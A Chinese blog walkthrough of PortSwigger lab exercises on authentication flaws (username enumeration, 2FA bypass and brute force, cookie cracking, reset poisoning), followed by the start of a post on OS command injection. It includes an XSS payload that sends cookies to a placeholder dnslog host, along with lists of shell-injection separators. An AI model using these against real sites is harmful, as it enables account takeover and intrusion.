title="认证漏洞如何产生的？"></a>认证漏洞如何产生的？</h2><p>广义上讲，认证机制中的大多数漏洞都是通过以下两种方式之一产生的：</p><p>- </p><p>  认证机制薄弱，因为它们未能充分防御暴力攻击。</p><p>- </p><p>  在实现过程中存在逻辑缺陷或不良编码，允许攻击者完全绕过认证机制。这有时被称为“破解认证”。</p><p>在Web开发的许多领域中，逻辑缺陷会导致网站的行为出乎意料，这可能是也可能不是一个安全问题。然而，由于认证对安全至关重要，有缺陷的认证逻辑会使网站暴露安全问题的可能性明显提高。</p><h2 id="认证机制中的漏洞"><a href="#认证机制中的漏洞" class="headerlink" title="认证机制中的漏洞"></a>认证机制中的漏洞</h2><p>认证漏洞包含很多比如，密码登陆爆破，多重认证机制。</p><h3 id="基于密码登陆中的漏洞"><a href="#基于密码登陆中的漏洞" class="headerlink" title="基于密码登陆中的漏洞"></a>基于密码登陆中的漏洞</h3><p>使用暴力破解。</p><ul><li><p><strong>状态码</strong>：在暴力破解攻击期间，返回的HTTP状态码对于绝大多数猜测来说可能是相同的，因为大部分猜测都是错误的。如果一个猜测返回了不同的状态码，这是用户名正确的强烈指示。网站最佳实践是无论结果如何，始终返回相同的状态码，但并非总是遵循这种做法。</p></li><li><p><strong>错误信息</strong>：有时，返回的错误信息会根据用户名和密码都不正确还是仅密码不正确而不同。网站最佳实践是在两种情况下都使用相同的通用信息，但有时会出现一些小的打字错误。即使只有一个字符位置错误，两条信息也会不同，即使该字符在呈现的页面上不可见。</p></li><li><p><strong>响应时间</strong>：如果大多数请求的响应时间相似，任何与此不同的请求都表明后台发生了不同的事情。这是另一个表明猜测的用户名可能正确的迹象。例如，如果用户名有效，网站可能只会检查密码是否正确。此额外步骤可能会导致响应时间略有增加。这可能很微妙，但攻击者可以通过输入过长的密码来使这种延迟变得更加明显，而网站需要更长的时间来处理。</p></li></ul><h4 id="相关靶场"><a href="#相关靶场" class="headerlink" title="相关靶场"></a>相关靶场</h4><h5 id="通过不同响应进行用户名枚举"><a href="#通过不同响应进行用户名枚举" class="headerlink" title="通过不同响应进行用户名枚举"></a>通过不同响应进行用户名枚举</h5><p>这个靶场如上面第一个所示，通过观看状态码来判断用户名。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308251534411.png"></p><p>随便尝试用户名和密码，只显示用户名无效。这样我们可以进行爆破把用户名爆破出来。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308251541961.png"></p><p>burp intrude 使用狙击手，paylods使用提供的用户名。开始攻击，观察响应。发现有一个长度和其他不同说明。这个用户名是真确的</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308251548593.png"></p><p>根据正确的用户名，在使用提供的密码进行爆破即可。</p><h5 id="通过微妙不同的响应进行用户枚举。"><a href="#通过微妙不同的响应进行用户枚举。" class="headerlink" title="通过微妙不同的响应进行用户枚举。"></a>通过微妙不同的响应进行用户枚举。</h5><p>要使用burp intrude 中的Grep Extract 用来提取信息，这微妙的地方如上面第二条所示。即使是一个字符错误也会是两条不同的消息。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308251610059.png"></p><p>可以看到登陆失败后提示用户名或密码无效。但后面有一个点。这就是微妙的错误</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308251607533.png"></p><p>使用提供的用户名开始爆破。看到这个结尾没有点与其他不同，说明用户名是这个。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308251614907.png"></p><p>在使用密码进行爆破。</p><h5 id="通过响应时间进行用户枚举。"><a href="#通过响应时间进行用户枚举。" class="headerlink" title="通过响应时间进行用户枚举。"></a>通过响应时间进行用户枚举。</h5><p>如上面第三条所说，如果网站检测用户名正确那只会检测密码是否正确。使用过长的密码让这种更加明显。</p><p>此靶场使用了ip锁定机制，如果用户名密码输入错误次数过多就会封锁ip地址。我们使用burp intrude 中的草叉模式（Pitchfork ）。这种攻击模式使用一 一对应的关系。如payload1 是A 和B 。payload2 是C和D 那么进行二次攻击 A和C 与B和D。并不像集束炸弹模式（Cluster bomb）那样一对多。</p><p>添加<strong>X-Forwarded-For</strong>，<strong>XFF</strong>是用来识别通过HTTP代理或负载均方式连接到Web服务器的客户端最原始的IP地址的HTTP头字段</p><p>开始攻击发现一个收到请求为268 一个回复万层为668 两者相差过大说明这个用户名正确。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308251716265.png"></p><p>再添加变量到password上进行爆破。</p><h4 id="有缺陷的暴力保护"><a href="#有缺陷的暴力保护" class="headerlink" title="有缺陷的暴力保护"></a>有缺陷的暴力保护</h4><ul><li>如果远程用户尝试登录失败次数过多，则锁定其尝试访问的帐户</li><li>如果远程用户连续多次尝试登录，则阻止其 IP 地址</li></ul><h5 id="暴力破解保护，IP封锁"><a href="#暴力破解保护，IP封锁" class="headerlink" title="暴力破解保护，IP封锁"></a>暴力破解保护，IP封锁</h5><p>有时您可能会发现，如果登录失败次数过多，您的 IP 就会被封锁。在一些实现中，如果IP所有者成功登录，则失败尝试次数的计数器重置。这意味着攻击者只需每隔几次尝试就登录自己的帐户，以防止达到此限制。</p><p>利用这种使用burp intrude 的草叉模式（Pitchfork ）。使正确的用户名和错误的用户名实现交叉登陆来绕过。</p><p>靶场提示攻击carlos 账户 </p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308261743705.png"></p><p>如下所示</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308261803382.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308261804491.png"></p><p>开始爆破即可。</p><h5 id="同过账户锁定枚举用户名"><a href="#同过账户锁定枚举用户名" class="headerlink" title="同过账户锁定枚举用户名"></a>同过账户锁定枚举用户名</h5><p>网站为了防止暴力破解，有一种方式是当满足某些可疑条件时（通常是一定数量的登录失败尝试）锁定账户。就像普通的登录错误一样，服务器返回表明账户已被锁定的响应也可以帮助攻击者枚举用户名。</p><p>通过多个用户名列表尝试单个密码，并观察响应有何不同。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308261816703.png"></p><p>使用burp 束炸弹模式（Cluster bomb） 第一个使用用户名列表 第二个设置为空。然后开始攻击。观察响应，其他都是用户或密码无效。有一个是，您尝试登录的错误次数过多。请 1 分钟后重试。说明用户名被锁定。得出该用户名存在。</p><p>在使用狙击手爆破密码。</p><p>保护方法：</p><ol><li>建立可能有效的候选用户名列表。这可以通过用户名枚举或简单地基于常见用户名列表来实现。</li><li>确定您认为至少一个用户可能拥有的一个非常小的密码候选列表。至关重要的是，您选择的密码数量不得超过允许的登录尝试次数。例如，如果您计算出尝试次数的限制为 3 次，则您最多需要选择 3 次密码猜测。</li><li>使用 Burp Intruder 等工具，使用每个候选用户名尝试每个选定的密码。这样，您就可以尝试暴力破解每个帐户，而不会触发帐户锁定。您只需要一个用户使用三个密码之一即可危及帐户。</li></ol><h5 id="暴力保护被破坏，每个请求有多个凭据"><a href="#暴力保护被破坏，每个请求有多个凭据" class="headerlink" title="暴力保护被破坏，每个请求有多个凭据"></a>暴力保护被破坏，每个请求有多个凭据</h5><p>网站防止暴力破解攻击的另一种方式是通过用户速率限制。在这种情况下，在短时间内进行过多的登录请求会导致你的IP地址被封禁。通常，IP地址只能通过以下方式解除：</p><p>- </p><p>  在一定的时间段后自动解除</p><p>- </p><p>  管理员手动解除</p><p>- </p><p>  用户在成功完成验证码后手动解除</p><p>用户速率限制有时比账户锁定更受欢迎，因为它更不容易受到用户名枚举和拒绝服务攻击的影响。然而，它仍然不是完全安全的。正如我们在之前的实验中看到的一个例子，攻击者有几种方法可以操纵其表面的IP地址以绕过封禁。</p><p>由于限制是基于从用户的IP地址发送的HTTP请求的速率，如果你可以找出如何使用单个请求猜测多个密码，那么有时也可以绕过这种防御措施。</p><p>将密码列表以json的形式提交。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308271806837.png"></p><p>随机填写用户名和密码，发现提交方式是JSON的格，靶场要求攻击carlos的用户。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login HTTP/2</span><br><span class="line">Host: 0ad4008604e1d47780fa802400e70082.web-security-academy.net</span><br><span class="line">Cookie: session=F3tSZ0EhA1nm0EMis5RkycKlbQcb2HiA</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://0ad4008604e1d47780fa802400e70082.web-security-academy.net/login</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 34</span><br><span class="line">Origin: https://0ad4008604e1d47780fa802400e70082.web-security-academy.net</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;carlos&quot;,&quot;password&quot;:&quot;dff&quot;&#125;</span><br></pre></td></tr></table></figure><p>将password的密码列表改为json格式的数组。开始攻击即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;carlos&quot;,</span><br><span class="line">&quot;password&quot;:[</span><br><span class="line">  &quot;123456&quot;,</span><br><span class="line">  &quot;password&quot;,</span><br><span class="line">  &quot;qwerty&quot;</span><br><span class="line">  ..........</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多重身份验证中的漏洞"><a href="#多重身份验证中的漏洞" class="headerlink" title="多重身份验证中的漏洞"></a>多重身份验证中的漏洞</h2><p>多重身份验证简称（2FA），就是在原有密码登陆的基础上添加新的验证机制。确认是否是该用户。如常见的邮箱验证，手机验证。</p><h3 id="绕过双因素验证"><a href="#绕过双因素验证" class="headerlink" title="绕过双因素验证"></a>绕过双因素验证</h3><p>有时，双因素认证的实现存在缺陷，以至于可以完全绕过它。</p><p>如果用户首先被要求输入密码，然后在另一页上被要求输入验证码，那么用户在输入验证码之前实际上已经处于“已登录”的状态。在这种情况下，值得测试一下在完成第一步认证后，是否可以直接跳转到“仅限已登录”的页面。偶尔，你会发现网站在加载页面之前实际上并没有检查你是否完成了第二步认证。</p><p>靶场已经知道了用户名和密码。但是无权访问2FA验证码</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308291634114.png"></p><p>登陆步骤；1.用户名密码输入登陆。2.跳转到验证码输入3.完成登陆。</p><p>我们先使用自己的凭证进行登陆，依次完成上面三个步骤后。发现最终的get请求是&#x2F;my-account?id&#x3D;wiener（让人想到的就是越权漏洞）,?id&#x3D;wiener是我们的用户名，这个参数我们可以进行更改。上面已经说过在，步骤1的时候我们就已经是登陆的状态，是否可以直接跳过2FA验证。</p><p>直接在第二步更改请求为第3步的请求，更改参数?id&#x3D;carlos.跳过成功。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308291645911.png"></p><h3 id="有缺陷的双因素验证漏洞。"><a href="#有缺陷的双因素验证漏洞。" class="headerlink" title="有缺陷的双因素验证漏洞。"></a>有缺陷的双因素验证漏洞。</h3><p>有时，双因素身份验证中存在缺陷的逻辑意味着用户完成初始登录步骤后，网站无法充分验证同一用户是否正在完成第二步。</p><p>例如，用户在第一步中使用普通凭据登录，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login-steps/first HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com ... </span><br><span class="line">username=carlos&amp;password=qwerty</span><br></pre></td></tr></table></figure><p>然后，他们会被分配一个与其帐户相关的 cookie，然后进入登录过程的第二步：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Set-Cookie: account=carlos </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /login-steps/second HTTP/1.1 </span><br><span class="line">Cookie: account=carlos</span><br></pre></td></tr></table></figure><p>提交验证码时，请求使用此 cookie 来确定用户尝试访问哪个帐户：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login-steps/second HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: account=carlos</span><br><span class="line">... </span><br><span class="line">verification-code=123456</span><br></pre></td></tr></table></figure><p>在这种情况下，攻击者可以使用自己的凭据登录，然后<code>account</code>在提交验证码时将 cookie 的值更改为任意用户名。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login-steps/second HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Cookie: account=victim-user </span><br><span class="line">... </span><br><span class="line">verification-code=123456</span><br></pre></td></tr></table></figure><p>网站输入用户名和密码后，网站会分配一个cookie来确定登陆用户。提交验证码这个cookie也会存在。由于该验证码只有四位因此可以通过爆破的方式。如下cookie中有个verfy确认用户。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login2 HTTP/2</span><br><span class="line">Host: 0ad20047034c4d698074b74d00b80082.web-security-academy.net</span><br><span class="line">Cookie: session=VLfdYWPfrRMnWGJYmtMfMVt1vXUVPgnm; verify=wiener</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 13</span><br><span class="line">Origin: https://0ad20047034c4d698074b74d00b80082.web-security-academy.net</span><br><span class="line">Referer: https://0ad20047034c4d698074b74d00b80082.web-security-academy.net/login2</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line">mfa-code=1121</span><br></pre></td></tr></table></figure><p>进行验证码爆破</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308291733429.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308291739075.png"></p><p>爆破状态码有个302就行。</p><h3 id="暴力破解2FA验证"><a href="#暴力破解2FA验证" class="headerlink" title="暴力破解2FA验证"></a>暴力破解2FA验证</h3><p>与密码一样，网站需要采取措施防止 2FA 验证码被暴力破解。这一点尤其重要，因为代码通常是简单的 4 或 6 位数字。如果没有足够的强力保护，破解这样的代码是微不足道的。一些网站试图通过在用户输入一定数量的错误验证码时自动注销用户来防止这种情况。这在实践中是无效的，因为高级攻击者甚至可以通过为 Burp Intruder创建宏来自动化这个多步骤过程。Turbo Intruder扩展也可用于此目的。</p><p>靶场</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308301652060.png"></p><p>步骤：点击project options —&gt; sessions—-&gt;sessions handling rules  add—&gt; scope—&gt;include all URL –&gt; Detalis—&gt;Rule Action  —–&gt; add –&gt;run a macro</p><p>然后selcet macro –&gt;add 依次选择GET &#x2F;login  POST &#x2F;login  GET &#x2F;login2 测试宏查看是否是验证码输入界面，依次ok</p><p>将请求发送<code>POST /login2</code>给 Burp Intruder. payloads选择number 0000-9999 最大&#x2F;最小整数为4 最大小数为0.</p><p>请求数设置为1 不然太高会返回400（我扫了一个下午）</p><p>开始攻击，得到一个302跳转界面</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308301652027.png"></p><h2 id="其他身份验证机制中的漏洞"><a href="#其他身份验证机制中的漏洞" class="headerlink" title="其他身份验证机制中的漏洞"></a>其他身份验证机制中的漏洞</h2><h3 id="保持用户登陆状态"><a href="#保持用户登陆状态" class="headerlink" title="保持用户登陆状态"></a>保持用户登陆状态</h3><p>一个常见的功能是即使在关闭浏览器会话后也可以选择保持登录状态。这通常是一个简单的复选框，标记为“记住我”或“让我保持登录状态”。</p><p>此功能通常通过生成某种“记住我”令牌来实现，然后将其存储在持久 cookie 中。由于拥有此 cookie 可以有效地让您绕过整个登录过程，因此最佳实践是让此 cookie 无法猜测。然而，一些网站根据可预测的静态值串联（例如用户名和时间戳）生成此 cookie。有些甚至使用密码作为 cookie 的一部分。如果攻击者能够创建自己的帐户，则这种方法尤其危险，因为他们可以研究自己的 cookie 并可能推断出它是如何生成的。一旦他们计算出公式，他们就可以尝试暴力破解其他用户的 cookie 来访问他们的帐户。</p><p>一些网站认为，如果 cookie 以某种方式加密，即使它确实使用静态值，也不会被猜测。虽然如果操作正确的话这可能是正确的，但使用简单的双向编码（如 Base64）天真地“加密”cookie 并不能提供任何保护。即使使用单向哈希函数进行适当的加密也不是完全无懈可击的。如果攻击者能够轻松识别哈希算法，并且不使用盐，他们就可以通过简单地哈希其单词列表来暴力破解 cookie。如果类似的限制未应用于 cookie 猜测，则此方法可用于绕过登录尝试限制。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308301731069.png"></p><p>先使用提供的用户名和密码登陆之后，点击勾选记住。在burp 历史里点击查看就会发现数据包中stay-logged-in有数据。进行base64解密，发现cookie构成是 前缀用户名: MD5 在进行base64加密。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308301734242.png"></p><p>使用burp intrude中的<strong>Payloadprocessing</strong> ，可以定义 Payload 处理规则，以在发送攻击负载之前或之后对其进行处理。例如，可以对负载进行编码、解码、加密或其他自定义处理，以欺骗应用程序的安全机制。</p><p>依次添加</p><p>为了确保攻击成功，使用 grep match  确定我们是否已成功暴力破解 cookie。在<strong>“设置”</strong>选项卡上，添加 grep 匹配规则以标记包含字符串 的任何响应<code>Update email</code>。开始攻击。</p><p>看到设置的匹配规则有响应。说明成功</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308301744118.png"></p><h3 id="离线密码破解。"><a href="#离线密码破解。" class="headerlink" title="离线密码破解。"></a>离线密码破解。</h3><p>上面的案例中是有自己的账号从而从cookie中 爆破。假设没有自己的账号，可以通过xss漏洞获取用户cookie。进行爆破</p><p>即使攻击者无法创建自己的帐户，他们仍然可以利用此漏洞。使用XSS等常用技术，攻击者可以窃取其他用户的“记住我”cookie，并推断出 cookie 的构造方式。如果网站是使用开源框架构建的，则 cookie 构建的关键细节甚至可能会被公开记录。</p><p>在极少数情况下，可能会从 cookie 中以明文形式获取用户的实际密码，即使它是经过哈希处理的。众所周知的密码列表的散列版本可以在线获得，因此如果用户的密码出现在这些列表之一中，解密散列有时就像将散列粘贴到搜索引擎一样简单。这证明了盐在有效加密中的重要性。</p><p>根据靶场提示使用xss获取cookie。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308312023498.png"></p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&#x27;dnslog域名&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>使用document.location 加载一个URL。document.cookie获取cookie.<code>document</code>对象是文档的根节点，每张网页都有自己的<code>document</code>对象。</p><p>插入到一个网页的评论区，查看donlog日志。得到一个</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308312117447.png"></p><p>解码</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308312118833.png"></p><p>在使用md5解出即可。登陆删除受害者的用户名：carlos</p><h2 id="重置用户密码"><a href="#重置用户密码" class="headerlink" title="重置用户密码"></a>重置用户密码</h2><p>在实践中，某些用户肯定会忘记密码，因此通常有办法让他们重置密码。由于通常的基于密码的身份验证在这种情况下显然是不可能的，因此网站必须依靠替代方法来确保真正的用户正在重置自己的密码。因此，密码重置功能本质上是危险的，需要安全地实现。</p><p>此功能通常有几种不同的实现方式，并且存在不同程度的漏洞。</p><h3 id="通过电子邮箱发送密码。"><a href="#通过电子邮箱发送密码。" class="headerlink" title="通过电子邮箱发送密码。"></a>通过电子邮箱发送密码。</h3><p>不言而喻，如果网站首先安全地处理密码，则永远不可能向用户发送当前密码。相反，某些网站会生成新密码并通过电子邮件将其发送给用户。</p><p>一般来说，应避免通过不安全的通道发送持久密码。在这种情况下，安全性依赖于生成的密码在很短的时间内到期，或者用户立即再次更改密码。否则，这种方法很容易受到中间人攻击。</p><p>鉴于收件箱是持久性的且并非真正为机密信息的安全存储而设计，因此电子邮件通常也不被认为是安全的。许多用户还通过不安全的渠道在多个设备之间自动同步收件箱。</p><h3 id="使用URL链接重置密码"><a href="#使用URL链接重置密码" class="headerlink" title="使用URL链接重置密码"></a>使用URL链接重置密码</h3><p>一种更可靠的重置密码方法是向用户发送一个唯一的URL，该URL将他们带到密码重置页面。较不安全的实现方法使用一个易于猜测的参数来识别正在重置的账户的URL，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://vulnerable-website.com/reset-password?user=victim-user</span><br></pre></td></tr></table></figure><p>在这个例子中，攻击者可以将<code>user</code>参数更改为他们已经确定的任何用户名。然后他们将直接进入一个页面，在该页面可以为这个任意用户设置一个新密码。</p><p>这个过程的更好实现方法是生成一个高熵的、难以猜测的令牌，并基于此创建重置URL。在最理想的情况下，该URL不应提供任何关于正在重置密码的用户的提示。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8</span><br></pre></td></tr></table></figure><p>当用户访问此URL时，系统应该在后端检查这个令牌是否存在，并确定它应该重置哪个用户的密码。该令牌应该在短时间内过期，并在重置密码后立即销毁。</p><p>然而，有些网站在提交重置表单时未再次验证令牌。在这种情况下，攻击者只需从他们自己的账户访问重置表单，删除令牌，并利用该页面重置任意用户的密码。</p><p>这个令牌使用来确认用户身份的，通过删除令牌发现仍然可以重置密码。说明令牌并没有验证。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309011750748.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309011758822.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309011757380.png"></p><p>把username 和 密码部分更改即可。</p><h3 id="通过中间件重置密码中毒"><a href="#通过中间件重置密码中毒" class="headerlink" title="通过中间件重置密码中毒"></a>通过中间件重置密码中毒</h3><p>通过反向代理把重置密码的链接返回到漏洞利用服务器上，刚好重置链接中也有识别身份的令牌，所以就需要用到X-Forwarded-Host指定反向代理服务器域名。</p><p>什么是反向代理？</p><p>是一种位于网络服务器和客户端之间的服务器，其主要功能是接收来自客户端的请求，然后将这些请求转发给一个或多个后端服务器，最终将后端服务器的响应返回给客户端。<code>X-Forwarded-Host</code>标头是由反向代理服务器或负载均衡器添加到HTTP请求中，以指示请求通过了哪个代理服务器。</p><p>添加</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309012001425.png"></p><p>查看漏洞服务器得到carlos的重置漏洞的令牌，token&#x3D;后面的令牌替换掉。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20200352.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309012005411.png"></p><p>重新设置密码登陆 通关</p><h2 id="更改用户密码"><a href="#更改用户密码" class="headerlink" title="更改用户密码"></a>更改用户密码</h2><p>通常，更改密码需要输入当前密码，然后输入新密码两次。这些页面从根本上依赖于与普通登录页面相同的过程来检查用户名和当前密码是否匹配。因此，这些页面可能容易受到相同技术的攻击。</p><p>如果密码更改功能允许攻击者在不以受害者用户身份登录的情况下直接访问它，则该功能可能特别危险。例如，如果在隐藏字段中提供用户名，则攻击者可能能够在请求中编辑此值以定位任意用户。这可能会被用来枚举用户名和暴力破解密码。</p><p>靶场逻辑就是根据不同的错误提供不同的响应，可以根据响应来进行爆破。如下</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309012022464.png"></p><p>第一种情况，旧密码错误。但两次新密码正确。账户被锁定一分钟后重新登陆。</p><p><strong><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309012031469.png"></strong></p><p>第二种情况，旧密码错误，两次新密码也不匹配。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309012036656.png"></p><p>提示当前密码不正确</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309012036916.png"></p><p>第三种情况，旧密码正确。两次新密码错误。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309012038654.png"></p><p>新密码不匹配</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309012039378.png"></p><p>那么我们可以根据第三种情况猜测用户的正确密码，如果匹配到新密码不正确，密码就是那个。需要用到burp 中的匹配功能</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309012043751.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /my-account/change-password HTTP/2</span><br><span class="line">Host: 0ab8008f04e051d980a16c2e00240076.web-security-academy.net</span><br><span class="line">Cookie: session=mFwNW09Z9dlLdJjj3uVp9W24t1Kpp8fw; session=Tl8nnAwsuiFRUFWlonhCHSppckBPAJSg</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 79</span><br><span class="line">Origin: https://0ab8008f04e051d980a16c2e00240076.web-security-academy.net</span><br><span class="line">Referer: https://0ab8008f04e051d980a16c2e00240076.web-security-academy.net/my-account/change-password</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line">username=carlos&amp;current-password=§peter§&amp;new-password-1=1122a&amp;new-password-2=aaaa</span><br></pre></td></tr></table></figure><p>添加密码列表开始攻击。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309012050009.png"></p><p>登陆 通关</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 身份认证漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>os命令注入靶场</title>
      <link href="/2023/08/22/os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/08/22/os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="前言：学习记录"><a href="#前言：学习记录" class="headerlink" title="#前言：学习记录"></a>#前言：学习记录</h1><h2 id="什么是OS命令注入漏洞？"><a href="#什么是OS命令注入漏洞？" class="headerlink" title="什么是OS命令注入漏洞？"></a>什么是OS命令注入漏洞？</h2><p>操作系统命令注入（也称为 shell 注入）是一种 Web 安全漏洞，允许攻击者在运行应用程序的服务器上执行任意操作系统 (OS) 命令，通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用操作系统命令注入漏洞来危害托管基础设施的其他部分，利用信任关系将攻击转向组织内的其他系统。（简单点就是，攻击者可以在网站上输入一些操作系统命令，然后服务器返回一些信息，如windows上的cmd linux上的bash.)</p><h2 id="常见的命令"><a href="#常见的命令" class="headerlink" title="常见的命令"></a>常见的命令</h2><table><thead><tr><th>命令的目的</th><th>Linux</th><th>windows</th></tr></thead><tbody><tr><td>当前用户名</td><td><code>whoami</code></td><td><code>whoami</code></td></tr><tr><td>操作系统</td><td><code>uname -a</code></td><td><code>ver</code></td></tr><tr><td>网络配置</td><td><code>ifconfig</code></td><td><code>ipconfig /all</code></td></tr><tr><td>网络连接</td><td><code>netstat -an</code></td><td><code>netstat -an</code></td></tr><tr><td>正在运行的进程</td><td><code>ps -ef</code></td><td><code>tasklist</code></td></tr></tbody></table><h2 id="注入操作系统命令的方式"><a href="#注入操作系统命令的方式" class="headerlink" title="注入操作系统命令的方式"></a>注入操作系统命令的方式</h2><p>各种 shell 元字符可用于执行操作系统命令注入攻击。</p><p>许多字符充当命令分隔符，允许将命令链接在一起。以下命令分隔符适用于 Windows 和基于 Unix 的系统：</p><ul><li><code>&amp;</code></li><li><code>&amp;&amp;</code></li><li><code>|</code></li><li><code>||</code></li></ul><p>以下命令分隔符仅适用于基于 Unix 的系统：</p><ul><li><code>;</code></li><li>换行符 (<code>0x0a</code>或<code>\n</code>)</li></ul><p>在基于 Unix 的系统上，您还可以使用反引号或美元字符在原始命令中执行注入命令的内联执行：</p><ul><li>`&#96;&#96;注入命令&#96;&#96;&#96;</li><li><code>$(</code>注入命令<code>)</code></li></ul><h2 id="靶场"><a href="#靶场" 